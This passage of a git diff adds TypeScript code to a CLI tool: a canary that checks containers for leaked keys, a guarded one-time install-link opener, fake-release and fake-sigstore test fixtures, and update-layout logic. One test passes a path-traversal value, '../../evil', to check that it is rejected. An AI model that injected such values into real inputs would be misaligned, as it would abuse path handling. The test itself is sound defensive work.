@@ -1,0 +1,3768 @@
+diff --git a/apps/cli/package.json b/apps/cli/package.json
+new file mode 100644
+index 0000000..f5fcd19
+--- /dev/null
++++ b/apps/cli/package.json
+@@ -0,0 +1,13 @@
++{
++  "name": "@localdot/cli",
++  "version": "0.0.0",
++  "private": true,
++  "type": "module",
++  "scripts": {
++    "typecheck": "tsc --noEmit -p ."
++  },
++  "dependencies": {
++    "@localdot/protocol": "workspace:*",
++    "sigstore": "5.0.0"
++  }
++}
+diff --git a/apps/cli/src/doctor/canary.test.ts b/apps/cli/src/doctor/canary.test.ts
+new file mode 100644
+index 0000000..fdf7441
+--- /dev/null
++++ b/apps/cli/src/doctor/canary.test.ts
+@@ -0,0 +1,128 @@
++import { describe, expect, it, vi } from "vitest";
++import { type CanaryDeps, MIN_BYTES, runCanary, type ScanResult } from "./canary.ts";
++
++const SURROGATE = "ld_http_surrogatefortests_ab12";
++const FULL: Omit<ScanResult, "hits"> = { processes: 40, bytes: MIN_BYTES * 2, files: 500 };
++
++function deps(over: Partial<CanaryDeps> = {}, scan?: (needles: string[]) => ScanResult) {
++  const keys = new Map<string, unknown>();
++  const d: CanaryDeps = {
++    keydSealKey: vi.fn(async () => "seal-key"),
++    putKey: vi.fn(async (b: { id: string }, sealed: unknown) => void keys.set(b.id, sealed)),
++    deleteKey: vi.fn(async (id: string) => void keys.delete(id)),
++    seal: vi.fn(async (_k: string, _b: unknown, value: string) => ({
++      sealedValueLength: value.length,
++    })),
++    readyDesktops: vi.fn(async () => [{ cellId: "c1", container: "localdot-desktop-c1" }]),
++    readSurrogate: vi.fn(async () => SURROGATE),
++    scan: vi.fn(async (_c: string, needles: string[]) =>
++      scan
++        ? scan(needles)
++        : { ...FULL, hits: [`${needles[1]}|raw|file /etc/localdot/cell/surrogates.sh`] },
++    ),
++    envName: (id: string) => `LOCALDOT_KEY_${id.toUpperCase().replaceAll("-", "_")}`,
++    sleep: async () => {},
++    ...over,
++  };
++  return { d, keys };
++}
++
++describe("doctor --canary", () => {
++  it("passes when the stand-in is found and the value is not, and removes the canary", async () => {
++    const { d, keys } = deps();
++    const v = await runCanary(d);
++    expect(v.level).toBe("ok");
++    expect(v.detail).toMatch(/no computer holds the canary \(1 computer, 40 processes, 200 MiB/);
++    const [binding] = vi.mocked(d.putKey).mock.calls[0] as unknown as [
++      { id: string; hosts: string[] },
++    ];
++    expect(binding.hosts).toEqual(["canary.localdot.example"]);
++    expect(d.deleteKey).toHaveBeenCalledWith(binding.id);
++    expect(keys.size).toBe(0);
++    const [, needles] = vi.mocked(d.scan).mock.calls[0] as unknown as [string, string[]];
++    expect(needles[0]).toMatch(/^canary-[A-Za-z0-9_-]{32}$/);
++    expect(needles[1]).toBe(SURROGATE);
++    expect(d.seal).toHaveBeenCalledWith("seal-key", binding, needles[0]);
++  });
++
++  it("fails on the real value anywhere in a computer, without printing it", async () => {
++    const { d } = deps({}, (n) => ({
++      ...FULL,
++      hits: [`${n[1]}|raw|file /etc/localdot/cell/surrogates.sh`, `${n[0]}|base64|memory pid 812`],
++    }));
++    const v = await runCanary(d);
++    expect(v.level).toBe("fail");
++    expect(v.detail).toMatch(
++      /^LEAK: computer c1 holds the canary's real value \(base64\|memory pid 812\)/,
++    );
++    const needles = (vi.mocked(d.scan).mock.calls[0] as unknown as [string, string[]])[1];
++    expect(v.detail).not.toContain(needles[0]);
++    expect(d.deleteKey).toHaveBeenCalledOnce();
++  });
++
++  it("fails closed when the scan cannot see the stand-in", async () => {
++    const { d } = deps({}, () => ({ ...FULL, hits: [] }));
++    expect((await runCanary(d)).detail).toMatch(
++      /did not find the canary's stand-in, so it is blind/,
++    );
++  });
++
++  it("fails closed when the scan covered too little", async () => {
++    const { d } = deps({}, (n) => ({
++      processes: 3,
++      bytes: 10,
++      files: 2,
++      hits: [`${n[1]}|raw|env pid 1`],
++    }));
++    expect((await runCanary(d)).detail).toMatch(/covered too little/);
++  });
++
++  it("fails closed when the computer never gets the stand-in", async () => {
++    const { d } = deps({ readSurrogate: vi.fn(async () => null) });
++    const v = await runCanary(d);
++    expect(v).toMatchObject({ level: "fail" });
++    expect(v.detail).toMatch(/never got the canary's stand-in/);
++    expect(d.scan).not.toHaveBeenCalled();
++    expect(d.deleteKey).toHaveBeenCalledOnce();
++  });
++
++  it("removes the canary when the scan throws, and keeps the value out of the error", async () => {
++    let value = "";
++    const { d } = deps({
++      scan: vi.fn(async (_c: string, needles: string[]) => {
++        value = needles[0] as string;
++        throw new Error(`python3 died near ${needles[0]}`);
++      }),
++    });
++    const v = await runCanary(d);
++    expect(v.detail).toMatch(/the canary failed: python3 died near <canary>/);
++    expect(v.detail).not.toContain(value);
++    expect(d.deleteKey).toHaveBeenCalledOnce();
++  });
++
++  it("says when the canary key could not be removed", async () => {
++    const { d } = deps({ deleteKey: vi.fn(async () => Promise.reject(new Error("offline"))) });
++    const v = await runCanary(d);
++    expect(v.level).toBe("fail");
++    expect(v.detail).toMatch(/could not be removed: remove it under Keys/);
++  });
++
++  it("plants nothing when keyd is offline or no computer runs", async () => {
++    const offline = deps({ keydSealKey: vi.fn(async () => null) }).d;
++    expect((await runCanary(offline)).level).toBe("fail");
++    const idle = deps({ readyDesktops: vi.fn(async () => []) }).d;
++    expect(await runCanary(idle)).toMatchObject({ level: "warn" });
++    expect(offline.putKey).not.toHaveBeenCalled();
++    expect(idle.putKey).not.toHaveBeenCalled();
++  });
++
++  it("uses a fresh canary every run", async () => {
++    const a = deps().d;
++    const b = deps().d;
++    await runCanary(a);
++    await runCanary(b);
++    const id = (x: typeof a) =>
++      (vi.mocked(x.putKey).mock.calls[0] as unknown as [{ id: string }])[0].id;
++    expect(id(a)).not.toBe(id(b));
++  });
++});
+diff --git a/apps/cli/src/doctor/canary.ts b/apps/cli/src/doctor/canary.ts
+new file mode 100644
+index 0000000..3f55576
+--- /dev/null
++++ b/apps/cli/src/doctor/canary.ts
+@@ -0,0 +1,151 @@
++import { randomBytes } from "node:crypto";
++
++// What canary-scan.py prints (Part 4b, Task 15): the processes whose memory it read, the bytes of
++// memory it read, the files it read, and "needle|form|where" for every find.
++export interface ScanResult {
++  processes: number;
++  bytes: number;
++  files: number;
++  hits: string[];
++}
++
++export interface CanaryBinding {
++  id: string;
++  kind: "http";
++  hosts: string[];
++  header: string;
++  format: "bearer";
++}
++
++export interface CanaryDeps {
++  keydSealKey(): Promise<string | null>;
++  // POST /api/keys through the daemon, which refreshes every running computer's stand-ins.
++  putKey(binding: CanaryBinding, sealed: unknown): Promise<void>;
++  // DELETE /api/keys/:id; resolves on 204 and on 404 (already gone).
++  deleteKey(id: string): Promise<void>;
++  seal(publicKey: string, binding: CanaryBinding, value: string): Promise<unknown>;
++  readyDesktops(): Promise<{ cellId: string; container: string }[]>;
++  // The value of LOCALDOT_KEY_<NAME> in the container's /etc/localdot/cell/surrogates.sh, or null.
++  readSurrogate(container: string, envName: string): Promise<string | null>;
++  scan(container: string, needles: string[], roots: string[]): Promise<ScanResult>;
++  envName(id: string): string;
++  random?: (bytes: number) => Buffer;
++  sleep?: (ms: number) => Promise<void>;
++}
++
++export type CanaryVerdict = { level: "ok" | "warn" | "fail"; detail: string };
++
++// Part 4b's coverage floor: a scan that saw less proves nothing.
++export const MIN_PROCESSES = 20;
++export const MIN_BYTES = 100 * 1024 * 1024;
++export const MIN_FILES = 100;
++export const SCAN_ROOTS = ["/etc/localdot/cell", "/config", "/tmp", "/root"];
++const SURROGATE_WAIT_MS = 15_000;
++
++// `localdot doctor --canary` (spec "Setup and operations": doctor "runs the canary test"): plants a
++// fresh random key in keyd, lets every running computer get its stand-in, and scans each computer's
++// processes, memory and files for the real value. The stand-in must be found (the scan can see
++// where a key would be); the value must not. The canary is removed whatever happens. It is bound
++// to a reserved name (RFC 2606), so it is never sent anywhere, and its value is never printed.
++export async function runCanary(deps: CanaryDeps): Promise<CanaryVerdict> {
++  const random = deps.random ?? randomBytes;
++  const sleep = deps.sleep ?? ((ms: number) => new Promise((r) => setTimeout(r, ms)));
++  const sealKey = await deps.keydSealKey();
++  if (!sealKey)
++    return {
++      level: "fail",
++      detail: "keyd is offline: start it (localdot up) and run the canary again",
++    };
++  const cells = await deps.readyDesktops();
++  if (cells.length === 0)
++    return {
++      level: "warn",
++      detail: "skipped: no computer is running (start one, then run doctor --canary)",
++    };
++  const id = `doctor-canary-${random(4).toString("hex")}`;
++  const value = `canary-${random(24).toString("base64url")}`;
++  const binding: CanaryBinding = {
++    id,
++    kind: "http",
++    hosts: ["canary.localdot.example"],
++    header: "Authorization",
++    format: "bearer",
++  };
++  // Planted before the put returns: a put that fails after keyd stored the key still gets removed.
++  let planted = false;
++  let verdict: CanaryVerdict;
++  try {
++    const sealed = await deps.seal(sealKey, binding, value);
++    planted = true;
++    await deps.putKey(binding, sealed);
++    verdict = await scanAll(deps, cells, id, value, sleep);
++  } catch (err) {
++    const message =
++      err instanceof Error ? err.message.replaceAll(value, "<canary>") : "unknown error";
++    verdict = { level: "fail", detail: `the canary failed: ${message}` };
++  }
++  if (planted) {
++    try {
++      await deps.deleteKey(id);
++    } catch {
++      verdict = {
++        level: "fail",
++        detail: `${verdict.detail}; and the canary key ${id} could not be removed: remove it under Keys`,
++      };
++    }
++  }
++  return verdict;
++}
++
++async function scanAll(
++  deps: CanaryDeps,
++  cells: { cellId: string; container: string }[],
++  id: string,
++  value: string,
++  sleep: (ms: number) => Promise<void>,
++): Promise<CanaryVerdict> {
++  const seen = { processes: 0, bytes: 0, files: 0 };
++  for (const { cellId, container } of cells) {
++    let surrogate: string | null = null;
++    for (let waited = 0; surrogate === null && waited <= SURROGATE_WAIT_MS; waited += 500) {
++      surrogate = await deps.readSurrogate(container, deps.envName(id));
++      if (surrogate === null) await sleep(500);
++    }
++    if (surrogate === null) {
++      return {
++        level: "fail",
++        detail: `computer ${cellId} never got the canary's stand-in, so the scan cannot be trusted`,
++      };
++    }
++    const result = await deps.scan(container, [value, surrogate], SCAN_ROOTS);
++    const where = (needle: string) =>
++      result.hits.filter((h) => h.startsWith(`${needle}|`)).map((h) => h.slice(needle.length + 1));
++    const leaks = where(value);
++    if (leaks.length > 0) {
++      return {
++        level: "fail",
++        detail: `LEAK: computer ${cellId} holds the canary's real value (${leaks.slice(0, 3).join("; ")})`,
++      };
++    }
++    if (where(surrogate).length === 0) {
++      return {
++        level: "fail",
++        detail: `the scan of computer ${cellId} did not find the canary's stand-in, so it is blind`,
++      };
++    }
++    if (result.processes < MIN_PROCESSES || result.bytes < MIN_BYTES || result.files < MIN_FILES) {
++      return {
++        level: "fail",
++        detail: `the scan of computer ${cellId} covered too little (${result.processes} processes, ${result.bytes} bytes, ${result.files} files)`,
++      };
++    }
++    seen.processes += result.processes;
++    seen.bytes += result.bytes;
++    seen.files += result.files;
++  }
++  const n = cells.length;
++  return {
++    level: "ok",
++    detail: `no computer holds the canary (${n} computer${n === 1 ? "" : "s"}, ${seen.processes} processes, ${Math.round(seen.bytes / 2 ** 20)} MiB of memory, ${seen.files} files)`,
++  };
++}
+diff --git a/apps/cli/src/open-link.test.ts b/apps/cli/src/open-link.test.ts
+new file mode 100644
+index 0000000..12b994d
+--- /dev/null
++++ b/apps/cli/src/open-link.test.ts
+@@ -0,0 +1,89 @@
++import { chmodSync, mkdtempSync, writeFileSync } from "node:fs";
++import { tmpdir } from "node:os";
++import { join } from "node:path";
++import { describe, expect, it, vi } from "vitest";
++import { OpenLinkError, openInstallLink } from "./open-link.ts";
++
++const TOKEN = "t".repeat(43);
++const CODE = "c".repeat(43);
++
++function home(mode = 0o600) {
++  const dir = mkdtempSync(join(tmpdir(), "local dot's home-"));
++  writeFileSync(join(dir, "daemon-token"), `${TOKEN}\n`);
++  chmodSync(join(dir, "daemon-token"), mode);
++  return dir;
++}
++const answer = (status: number, body: unknown) =>
++  vi.fn(async () => new Response(JSON.stringify(body), { status }));
++
++describe("openInstallLink", () => {
++  it("mints a code with the token file and opens a #code= link that carries no token", async () => {
++    const fetchImpl = answer(201, { code: CODE, expiresAt: 1 });
++    const openUrl = vi.fn(async () => {});
++    const r = await openInstallLink({
++      home: home(),
++      port: 4750,
++      fetchImpl: fetchImpl as unknown as typeof fetch,
++      openUrl,
++    });
++    expect(r).toEqual({ url: `http://127.0.0.1:4750/#code=${CODE}`, opened: true });
++    expect(openUrl).toHaveBeenCalledWith(r.url);
++    expect(r.url).not.toContain(TOKEN);
++    const [url, init] = fetchImpl.mock.calls[0] as unknown as [string, RequestInit];
++    expect(url).toBe("http://127.0.0.1:4750/api/install-codes");
++    expect(init.headers).toEqual({ authorization: `Bearer ${TOKEN}` });
++  });
++
++  it("returns the link to print when the browser cannot be opened", async () => {
++    const r = await openInstallLink({
++      home: home(),
++      port: 4750,
++      fetchImpl: answer(201, { code: CODE }) as unknown as typeof fetch,
++      openUrl: async () => {
++        throw new Error("no GUI");
++      },
++    });
++    expect(r.opened).toBe(false);
++  });
++
++  it("refuses a token file others can read", async () => {
++    await expect(
++      openInstallLink({ home: home(0o644), port: 4750, openUrl: async () => {} }),
++    ).rejects.toThrow(/must be yours and private/);
++  });
++
++  it("says when the daemon is down or belongs to another home", async () => {
++    const down = vi.fn(async () => {
++      throw new TypeError("fetch failed");
++    });
++    await expect(
++      openInstallLink({
++        home: home(),
++        port: 4750,
++        fetchImpl: down as unknown as typeof fetch,
++        openUrl: async () => {},
++      }),
++    ).rejects.toBeInstanceOf(OpenLinkError);
++    await expect(
++      openInstallLink({
++        home: home(),
++        port: 4750,
++        fetchImpl: answer(401, "unauthorized") as unknown as typeof fetch,
++        openUrl: async () => {},
++      }),
++    ).rejects.toThrow(/another localdot home/);
++  });
++
++  it("never opens a link the daemon did not mint", async () => {
++    const openUrl = vi.fn(async () => {});
++    await expect(
++      openInstallLink({
++        home: home(),
++        port: 4750,
++        fetchImpl: answer(201, { code: "../../evil" }) as unknown as typeof fetch,
++        openUrl,
++      }),
++    ).rejects.toThrow(/no code/);
++    expect(openUrl).not.toHaveBeenCalled();
++  });
++});
+diff --git a/apps/cli/src/open-link.ts b/apps/cli/src/open-link.ts
+new file mode 100644
+index 0000000..1da18c2
+--- /dev/null
++++ b/apps/cli/src/open-link.ts
+@@ -0,0 +1,64 @@
++import { readFileSync, statSync } from "node:fs";
++import { join } from "node:path";
++
++export interface OpenLinkDeps {
++  home: string;
++  port: number;
++  fetchImpl?: typeof fetch;
++  // /usr/bin/open <url>; the code in it is spent on first use and dies in 60 s.
++  openUrl(url: string): Promise<void>;
++}
++
++export class OpenLinkError extends Error {
++  override name = "OpenLinkError";
++}
++
++// Mints a one-time link with the token file (which only this user can read) and opens it. The
++// token itself never leaves this process: not in the URL, not in output, not in an argument.
++export async function openInstallLink({
++  home,
++  port,
++  fetchImpl = fetch,
++  openUrl,
++}: OpenLinkDeps): Promise<{ url: string; opened: boolean }> {
++  const file = join(home, "daemon-token");
++  let st: ReturnType<typeof statSync>;
++  try {
++    st = statSync(file);
++  } catch {
++    throw new OpenLinkError(`no ${file}: is the daemon installed? Run: npx localdot`);
++  }
++  if ((st.mode & 0o077) !== 0 || (process.getuid && st.uid !== process.getuid())) {
++    throw new OpenLinkError(`${file} must be yours and private (chmod 600 ${file})`);
++  }
++  const token = readFileSync(file, "utf8").trim();
++  let res: Response;
++  try {
++    res = await fetchImpl(`http://127.0.0.1:${port}/api/install-codes`, {
++      method: "POST",
++      headers: { authorization: `Bearer ${token}` },
++      signal: AbortSignal.timeout(5000),
++    });
++  } catch {
++    throw new OpenLinkError(
++      `the daemon does not answer on 127.0.0.1:${port}: run localdot up, then localdot doctor`,
++    );
++  }
++  if (res.status === 401) {
++    throw new OpenLinkError(
++      `the daemon on port ${port} refused this home's token: another localdot home may be running there`,
++    );
++  }
++  if (res.status !== 201)
++    throw new OpenLinkError(`the daemon could not make a link (HTTP ${res.status})`);
++  const { code } = (await res.json()) as { code?: unknown };
++  if (typeof code !== "string" || !/^[A-Za-z0-9_-]{43}$/.test(code))
++    throw new OpenLinkError("the daemon answered with no code");
++  const url = `http://127.0.0.1:${port}/#code=${code}`;
++  try {
++    await openUrl(url);
++    return { url, opened: true };
++  } catch {
++    return { url, opened: false };
++  }
++}
+diff --git a/apps/cli/src/testing/staged-release.ts b/apps/cli/src/testing/staged-release.ts
+new file mode 100644
+index 0000000..544143b
+--- /dev/null
++++ b/apps/cli/src/testing/staged-release.ts
+@@ -0,0 +1,187 @@
++import { createHash } from "node:crypto";
++import { chmodSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
++import { tmpdir } from "node:os";
++import { dirname, join } from "node:path";
++import { sampleManifest } from "@localdot/protocol/testing";
++import { type BundleVerifier, GITHUB_WORKFLOW_BUILD, purl, SLSA_V1 } from "../verify/provenance.ts";
++import type { TrustPins } from "../verify/trust.ts";
++
++export const TEST_PINS: TrustPins = {
++  repository: "https://github.com/Shadowhusky/localdot",
++  workflow: ".github/workflows/release.yml",
++  issuer: "https://token.actions.githubusercontent.com",
++  teamId: "TESTTEAM01",
++  imageRepositories: {
++    desktop: "ghcr.io/shadowhusky/localdot-desktop",
++    gate: "ghcr.io/shadowhusky/localdot-gate",
++    brain: "ghcr.io/shadowhusky/localdot-brain",
++    browser: "ghcr.io/shadowhusky/localdot-browser",
++  },
++};
++
++const sha256 = (data: string | Buffer) => createHash("sha256").update(data).digest("hex");
++const sha512b64 = (data: string) => `sha512-${createHash("sha512").update(data).digest("base64")}`;
++
++export interface StagedRelease {
++  root: string;
++  version: string;
++  packageDir: string;
++  keydPath: string;
++  // The tarball stand-ins whose sha512 the lockfile records, by package name.
++  tarballs: Record<string, string>;
++}
++
++// A staged install as `npm install --prefix root localdot@version` leaves it, with a manifest that
++// matches every file. Tests then break one thing.
++export function stageRelease(
++  version = "1.0.0",
++  root = mkdtempSync(join(tmpdir(), "local dot's stage-")),
++  { nested = false } = {},
++): StagedRelease {
++  const packageDir = join(root, "node_modules", "localdot");
++  // npm puts a shrinkwrapped package's dependencies under it; a plain install hoists them.
++  const keydKey = nested
++    ? "node_modules/localdot/node_modules/@localdot/keyd-darwin-arm64"
++    : "node_modules/@localdot/keyd-darwin-arm64";
++  const keydDir = join(root, keydKey);
++  const payload: Record<string, string> = {
++    "bin/localdot.mjs": "#!/usr/bin/env node\nimport '../dist/cli.mjs';\n",
++    "dist/cli.mjs": "export {};\n",
++    "dist/daemon.mjs": "export {};\n",
++    "web/dist/index.html": "<!doctype html>\n",
++    "web/vendor/selkies/LICENSE": "Mozilla Public License Version 2.0\n",
++    "THIRD-PARTY.md": "# Third-party\n",
++    LICENSE: "MIT\n",
++  };
++  const files: Record<string, string> = {};
++  for (const [path, text] of Object.entries(payload)) {
++    write(join(packageDir, path), text);
++    files[path] = sha256(text);
++  }
++  const keyd = Buffer.from("\xCF\xFA\xED\xFEkeyd");
++  write(join(keydDir, "bin", "keyd"), keyd);
++  chmodSync(join(keydDir, "bin", "keyd"), 0o755);
++  write(
++    join(keydDir, "package.json"),
++    JSON.stringify({
++      name: "@localdot/keyd-darwin-arm64",
++      version,
++      os: ["darwin"],
++      cpu: ["arm64"],
++    }),
++  );
++  write(join(keydDir, "LICENSE"), "MIT\n");
++  const manifest = {
++    ...sampleManifest(),
++    version,
++    files,
++    keyd: { ...sampleManifest().keyd, sha256: sha256(keyd) },
++  };
++  write(join(packageDir, "release.json"), JSON.stringify(manifest));
++  write(
++    join(packageDir, "package.json"),
++    JSON.stringify({
++      name: "localdot",
++      version,
++      bin: { localdot: "bin/localdot.mjs" },
++      optionalDependencies: { "@localdot/keyd-darwin-arm64": version },
++    }),
++  );
++  const tarballs = {
++    localdot: `localdot-${version}.tgz`,
++    "@localdot/keyd-darwin-arm64": `keyd-darwin-arm64-${version}.tgz`,
++  };
++  write(
++    join(root, "package-lock.json"),
++    JSON.stringify({
++      lockfileVersion: 3,
++      packages: {
++        "node_modules/localdot": { version, integrity: sha512b64(tarballs.localdot) },
++        [keydKey]: {
++          version,
++          integrity: sha512b64(tarballs["@localdot/keyd-darwin-arm64"]),
++        },
++      },
++    }),
++  );
++  return { root, version, packageDir, keydPath: join(keydDir, "bin", "keyd"), tarballs };
++}
++
++export interface FakeProvenanceOptions {
++  repository?: string;
++  path?: string;
++  ref?: string;
++  subjectName?: string;
++  digestOf?: string;
++  // The identity the fake "certificate" carries; sigstore refuses any other policy.
++  signedIdentity?: string;
++  predicateType?: string;
++  extra?: number;
++}
++
++// The registry's attestation document for one package, in npm's real shape (checked against
++// @sigstore/core@3.2.1's on 2026-10-02), signed by a stand-in for sigstore.
++export function fakeAttestations(
++  name: string,
++  version: string,
++  tarball: string,
++  o: FakeProvenanceOptions = {},
++) {
++  const ref = o.ref ?? `refs/tags/v${version}`;
++  const statement = {
++    _type: "https://in-toto.io/Statement/v1",
++    subject: [
++      {
++        name: o.subjectName ?? purl(name, version),
++        digest: {
++          sha512: createHash("sha512")
++            .update(o.digestOf ?? tarball)
++            .digest("hex"),
++        },
++      },
++    ],
++    predicateType: SLSA_V1,
++    predicate: {
++      buildDefinition: {
++        buildType: GITHUB_WORKFLOW_BUILD,
++        externalParameters: {
++          workflow: {
++            ref,
++            repository: o.repository ?? TEST_PINS.repository,
++            path: o.path ?? TEST_PINS.workflow,
++          },
++        },
++      },
++    },
++  };
++  const slsa = {
++    predicateType: o.predicateType ?? SLSA_V1,
++    bundle: {
++      fakeIdentity:
++        o.signedIdentity ??
++        `${o.repository ?? TEST_PINS.repository}/${o.path ?? TEST_PINS.workflow}@${ref}`,
++      dsseEnvelope: {
++        payloadType: "application/vnd.in-toto+json",
++        payload: Buffer.from(JSON.stringify(statement)).toString("base64"),
++        signatures: [],
++      },
++    },
++  };
++  const publish = {
++    predicateType: "https://github.com/npm/attestation/tree/main/specs/publish/v0.1",
++    bundle: {},
++  };
++  return { attestations: [publish, slsa, ...Array.from({ length: o.extra ?? 0 }, () => slsa)] };
++}
++
++export const fakeSigstore: BundleVerifier = async (bundle, policy) => {
++  const identity = (bundle as { fakeIdentity?: string }).fakeIdentity;
++  if (policy.certificateIssuer !== TEST_PINS.issuer || identity !== policy.certificateIdentityURI) {
++    throw new Error(`certificate identity ${String(identity)} does not match`);
++  }
++};
++
++function write(path: string, data: string | Buffer) {
++  mkdirSync(dirname(path), { recursive: true });
++  writeFileSync(path, data);
++}
+diff --git a/apps/cli/src/update/layout.ts b/apps/cli/src/update/layout.ts
+new file mode 100644
+index 0000000..3c10d3d
+--- /dev/null
++++ b/apps/cli/src/update/layout.ts
+@@ -0,0 +1,128 @@
++import { randomBytes } from "node:crypto";
++import {
++  existsSync,
++  lstatSync,
++  mkdirSync,
++  readdirSync,
++  readFileSync,
++  readlinkSync,
++  renameSync,
++  rmSync,
++  symlinkSync,
++  writeFileSync,
++} from "node:fs";
++import { basename, join } from "node:path";
++import { RELEASE_VERSION } from "@localdot/protocol";
++
++// <home>/app/
++//   versions/<v>/      a release that passed verifyStagedRelease, renamed into place whole
++//   current            symlink -> versions/<v>; the LaunchAgents run through it
++//   staging-<v>-<hex>/ npm's working folder; never run, removed by every recovery
++//   update.json        the journal of an update in flight
++export interface AppLayout {
++  root: string;
++  versions: string;
++  current: string;
++  journal: string;
++}
++
++export function appLayout(home: string): AppLayout {
++  const root = join(home, "app");
++  return {
++    root,
++    versions: join(root, "versions"),
++    current: join(root, "current"),
++    journal: join(root, "update.json"),
++  };
++}
++
++export function versionDir(layout: AppLayout, version: string): string {
++  if (!RELEASE_VERSION.test(version)) throw new RangeError(`not a release version: ${version}`);
++  return join(layout.versions, version);
++}
++
++export function newStagingDir(layout: AppLayout, version: string): string {
++  mkdirSync(layout.root, { recursive: true, mode: 0o700 });
++  return join(layout.root, `staging-${version}-${randomBytes(6).toString("hex")}`);
++}
++
++// The version `current` points at, or null before the first install.
++export function currentVersion(layout: AppLayout): string | null {
++  const st = lstatSync(layout.current, { throwIfNoEntry: false });
++  if (!st?.isSymbolicLink()) return null;
++  const version = basename(readlinkSync(layout.current));
++  return RELEASE_VERSION.test(version) && existsSync(join(layout.versions, version))
++    ? version
++    : null;
++}
++
++// One rename replaces the link, so `current` always names a whole version: the old one or the new.
++export function switchCurrent(layout: AppLayout, version: string): void {
++  const target = join("versions", version);
++  if (!existsSync(join(layout.root, target))) throw new Error(`no installed version ${version}`);
++  const temp = `${layout.current}.tmp-${randomBytes(6).toString("hex")}`;
++  symlinkSync(target, temp);
++  renameSync(temp, layout.current);
++}
++
++// Moves a verified staging folder into versions/. A folder already there (an interrupted update
++// renamed it but never switched to it) is replaced: the staging copy was verified just now.
++export function promote(layout: AppLayout, staging: string, version: string): string {
++  const dir = versionDir(layout, version);
++  mkdirSync(layout.versions, { recursive: true, mode: 0o700 });
++  if (existsSync(dir)) {
++    if (currentVersion(layout) === version) throw new Error(`${version} is the running version`);
++    // Aside first: a kill during the removal leaves a staging-* folder, never half a version.
++    const aside = join(layout.root, `staging-old-${version}-${randomBytes(6).toString("hex")}`);
++    renameSync(dir, aside);
++    rmSync(aside, { recursive: true, force: true });
++  }
++  renameSync(staging, dir);
++  return dir;
++}
++
++// Staging folders and half-made links belong to no version; every recovery removes them.
++export function sweepLeftovers(layout: AppLayout): void {
++  if (!existsSync(layout.root)) return;
++  for (const name of readdirSync(layout.root)) {
++    if (/^staging-/.test(name) || /^current\.tmp-/.test(name))
++      rmSync(join(layout.root, name), { recursive: true, force: true });
++  }
++}
++
++// Keeps the running version and the one before it (for `localdot update --rollback`).
++export function pruneVersions(layout: AppLayout, keep: string[]): void {
++  if (!existsSync(layout.versions)) return;
++  for (const name of readdirSync(layout.versions)) {
++    if (!keep.includes(name)) rmSync(join(layout.versions, name), { recursive: true, force: true });
++  }
++}
++
++export type UpdatePhase = "staging" | "verified" | "images" | "stopped" | "switched";
++
++export interface UpdateJournal {
++  v: 1;
++  from: string | null;
++  to: string;
++  phase: UpdatePhase;
++}
++
++export function readJournal(layout: AppLayout): UpdateJournal | null {
++  try {
++    const j = JSON.parse(readFileSync(layout.journal, "utf8")) as UpdateJournal;
++    return j.v === 1 && typeof j.to === "string" ? j : null;
++  } catch {
++    return null;
++  }
++}
++
++export function writeJournal(layout: AppLayout, journal: UpdateJournal): void {
++  mkdirSync(layout.root, { recursive: true, mode: 0o700 });
++  const temp = `${layout.journal}.${randomBytes(6).toString("hex")}.tmp`;
++  writeFileSync(temp, `${JSON.stringify(journal)}\n`, { mode: 0o600 });
++  renameSync(temp, layout.journal);
++}
++
++export function clearJournal(layout: AppLayout): void {
++  rmSync(layout.journal, { force: true });
++}
+diff --git a/apps/cli/src/update/run.test.ts b/apps/cli/src/update/run.test.ts
+new file mode 100644
+index 0000000..0b6d75f
+--- /dev/null
++++ b/apps/cli/src/update/run.test.ts
+@@ -0,0 +1,171 @@
++import {
++  existsSync,
++  mkdirSync,
++  mkdtempSync,
++  readdirSync,
++  readlinkSync,
++  symlinkSync,
++  writeFileSync,
++} from "node:fs";
++import { tmpdir } from "node:os";
++import { join } from "node:path";
++import { describe, expect, it } from "vitest";
++import {
++  fakeAttestations,
++  fakeSigstore,
++  stageRelease,
++  TEST_PINS,
++} from "../testing/staged-release.ts";
++import { provenanceChecker } from "../verify/provenance.ts";
++import { verifyStagedRelease } from "../verify/release.ts";
++import { type AppLayout, appLayout, currentVersion, readJournal, switchCurrent } from "./layout.ts";
++import { recoverUpdate, runUpdate, type UpdateSteps } from "./run.ts";
++
++class Killed extends Error {}
++const STEPS = ["stage", "verify", "pullImages", "stopServices", "startServices"] as const;
++type Step = (typeof STEPS)[number];
++
++function fakeServices() {
++  return { running: null as string | null, starts: 0 };
++}
++
++function steps(
++  layout: AppLayout,
++  services: ReturnType<typeof fakeServices>,
++  killAt?: Step,
++): UpdateSteps {
++  const tarballs = new Map<string, Record<string, string>>();
++  const kill = (step: Step) => {
++    if (step === killAt) throw new Killed(step);
++  };
++  return {
++    async stage(dir, version) {
++      mkdirSync(dir, { recursive: true });
++      tarballs.set(version, stageRelease(version, dir).tarballs);
++      kill("stage");
++    },
++    async verify(dir, version) {
++      kill("verify");
++      return verifyStagedRelease(dir, version, {
++        pins: TEST_PINS,
++        codesign: async () => true,
++        provenance: provenanceChecker(
++          TEST_PINS,
++          async (n, v) => fakeAttestations(n, v, tarballs.get(v)?.[n] ?? ""),
++          fakeSigstore,
++        ),
++      });
++    },
++    async pullImages() {
++      kill("pullImages");
++    },
++    async stopServices() {
++      services.running = null;
++      kill("stopServices");
++    },
++    async startServices() {
++      services.running = currentVersion(layout);
++      services.starts += 1;
++      kill("startServices");
++    },
++  };
++}
++
++async function installed(version: string) {
++  const layout = appLayout(mkdtempSync(join(tmpdir(), "local dot's home-")));
++  const services = fakeServices();
++  await runUpdate(layout, version, steps(layout, services));
++  return { layout, services };
++}
++
++function invariants(layout: AppLayout, services: ReturnType<typeof fakeServices>) {
++  const current = currentVersion(layout);
++  expect(current, "current names a whole version").not.toBeNull();
++  expect(readlinkSync(layout.current)).toBe(join("versions", current as string));
++  expect(
++    existsSync(
++      join(layout.versions, current as string, "node_modules", "localdot", "release.json"),
++    ),
++  ).toBe(true);
++  expect(
++    readdirSync(layout.root).filter((n) => n.startsWith("staging-") || n.includes(".tmp-")),
++  ).toEqual([]);
++  expect(readJournal(layout)).toBeNull();
++  expect(services.running, "the services run the current version").toBe(current);
++  return current;
++}
++
++describe("update (Review Focus 2: update interrupted mid-way)", () => {
++  it("installs, then updates, keeping the previous version for rollback", async () => {
++    const { layout, services } = await installed("1.0.0");
++    expect(await runUpdate(layout, "1.1.0", steps(layout, services))).toEqual({
++      kind: "updated",
++      from: "1.0.0",
++      to: "1.1.0",
++    });
++    expect(invariants(layout, services)).toBe("1.1.0");
